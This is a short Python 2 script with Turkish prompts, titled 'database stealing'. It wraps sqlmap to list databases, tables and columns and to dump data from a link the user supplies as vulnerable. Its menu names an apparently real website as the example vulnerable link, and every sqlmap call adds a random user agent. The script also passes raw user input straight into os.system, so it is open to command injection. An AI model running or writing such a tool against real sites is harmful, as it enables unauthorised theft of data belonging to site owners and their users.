#!/usr/bin/env python



import os



os.system("apt-get install figlet")

os.system("clear")

os.system("figlet VERI TABANI CALMA")

print("""

Veri Tabani Calma Aracina Hosgeldin Profesyonel or UnProfesyonel Reis



1) Sadece Acikli Linki Biliyorum

2) Acikli Linki ve Veritabani Adini Biliyorum

3) Acikli Linki, Veritabani Adini ve Tablo Adini Biliyorum

4) Acikli Linki, Veritabani Adini , Tablo Adini ve Colon Adini Biliyorum

5) Hicbir sey Bilmiyorum





Ornek Acikli Link: http://www.suesupriano.com/article.php?id=25

""")



islemno = raw_input("Islem Numarasi Girin")



if(islemno=="1"):

	aciklilink = raw_input("Acikli Link Girin: ")

	os.system("sqlmap -u " +aciklilink + " --dbs --random-agent")

elif(islemno=="2"):

	aciklilink = raw_input("Acikli Link Girin: ")

	veritabani = raw_input("Veritabani Adini Girin:")

	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " --tables --random-agent")

elif(islemno=="3"):

	aciklilink = raw_input("Acikli Link Girin: ")

	veritabani = raw_input("Veritabani Adini Girin: ")

	tablo = raw_input("Tablo Adini Girin: ")

	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " --columns --random-agent")

elif(islemno=="4"):

	aciklilink = raw_input("Acikli Link Girin: ")

	veritabani = raw_input("Veritabani Adini Girin: ")

	tablo = raw_input("Tablo Adini Girin: ")

	colon = raw_input("Colon Adini Girin: ")

	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " -C " + colon + " --dump --random-agent")

elif(islemno=="5"):

	print("Programi Kapatiyorum Reis Kusura Bakma Yardim Edemem")



else:

	print("Hatali Secim Kapatiyorum")